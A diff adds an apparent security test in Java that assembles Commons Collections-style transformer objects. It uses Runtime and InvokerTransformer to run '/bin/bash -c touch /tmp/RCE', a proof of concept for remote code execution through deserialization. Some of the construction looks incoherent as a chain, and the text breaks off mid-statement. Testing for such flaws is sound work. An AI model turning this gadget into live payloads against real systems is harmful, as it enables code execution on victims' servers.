@@ -1,0 +1,21 @@
+public void testInvokerTransformer() throws Exception {
+    String cmd = "touch /tmp/RCE";
+    String[] execArgs = new String[] { "/bin/bash", "-c", cmd };
+    String[] execArgs2 = new String[] { "/bin/bash", "-c", "touch /tmp/RCE2" };
+
+    Map innerMap = new HashMap();
+    innerMap.put(new ConstantTransformer(Runtime.class), "getRuntime");
+
+    List innerList = new ArrayList(2);
+    innerList.add(execArgs);
+    innerList.add(execArgs2);
+
+    Map outerMap = new HashMap();
+    outerMap.put("command", innerList);
+    outerMap.put("input", new ByteArrayInputStream("".getBytes()));
+    outerMap.put("workingDirectory", new File("."));
+    outerMap.put("environment", new String[] {});
+
+    InvokerTransformer transformer = new InvokerTransformer("exec", new Class[] { String[].class, String[].class, File.class }, new Object[] { execArgs, null, null });
+
+    Map payload
